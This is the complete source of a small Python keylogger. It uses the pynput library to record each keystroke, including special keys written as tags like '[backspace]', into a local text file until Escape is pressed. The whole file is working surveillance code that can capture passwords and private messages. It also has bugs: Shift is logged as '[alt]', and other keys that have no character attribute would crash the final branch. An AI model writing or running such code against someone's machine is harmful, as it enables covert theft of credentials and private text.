import sys
from pynput import keyboard
import msvcrt as kb


class EndKeylogger(Exception): pass


def writeToFile(char):
    with open("keylogged.txt","a") as file:
        file.write(char)


def on_press(key):
    if key == keyboard.Key.esc:
        sys.tracebacklimit = -1
        raise EndKeylogger(key)
    elif key == keyboard.Key.enter:
        writeToFile("\n")
    elif key == keyboard.Key.space:
        writeToFile(" ")
    elif key == keyboard.Key.tab:
        writeToFile("    ")
    elif key == keyboard.Key.backspace:
        writeToFile("[backspace]")
    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
        writeToFile("[alt]")
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        writeToFile("[ctrl]")
    elif key == keyboard.Key.shift:
        writeToFile("[alt]")
    else:
        writeToFile(key.char)


def main():
    print("Keylogger is running...")

    with keyboard.Listener(
        on_press=on_press) as listener:
        try:
            listener.join()
        except EndKeylogger as e:
            while kb.kbhit(): kb.getch()    
            print("KeyLogger Ended")
    

if __name__ == "__main__":
    main()